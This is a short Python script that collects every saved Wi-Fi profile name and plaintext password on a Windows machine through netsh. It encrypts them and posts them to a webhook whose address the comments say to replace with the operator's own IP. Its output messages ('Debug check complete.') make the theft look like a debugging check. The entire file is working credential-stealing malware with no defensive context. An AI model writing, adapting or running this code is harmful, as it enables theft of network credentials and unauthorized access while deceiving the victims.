import subprocess
import requests
import json
from cryptography.fernet import Fernet

# Change to your IP
WEBHOOK_URL = 'http://127.0.0.1:5000/webhook'

# Generate or use an existing key
key = b'your-fernet-key-here'
cipher_suite = Fernet(key)

def get_wifi_profiles():
    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    profiles = []
    for line in result.stdout.split('\n'):
        if "All User Profile" in line:
            profile_name = line.split(":")[1].strip()
            profiles.append(profile_name)
    return profiles

def get_wifi_key(profile):
    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "Key Content" in line:
            return line.split(":")[1].strip()
    return None

def encrypt_data(data):
    # Convert data to JSON string and then encrypt
    data_str = json.dumps(data)
    encrypted_data = cipher_suite.encrypt(data_str.encode('utf-8'))
    return encrypted_data.decode('utf-8')

def send_to_webhook(encrypted_data):
    try:
        # Send encrypted data as JSON
        response = requests.post(WEBHOOK_URL, json={"encrypted_data": encrypted_data})
        if response.status_code == 200:
            print("Debug check complete.")
        else:
            print(f"Error Status Code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def show_and_send_wifi_keys():
    profiles = get_wifi_profiles()
    if not profiles:
        print("No debug data found.")
        return

    wifi_data = []

    for profile in profiles:
        key = get_wifi_key(profile)
        wifi_data.append({
            'profile': profile,
            'key': key or 'No Key Found'
        })
    
    # Encrypt the collected Wi-Fi profiles and keys
    encrypted_data = encrypt_data(wifi_data)
    
    # Send the encrypted data to the webhook
    send_to_webhook(encrypted_data)

if __name__ == "__main__":
    show_and_send_wifi_keys()
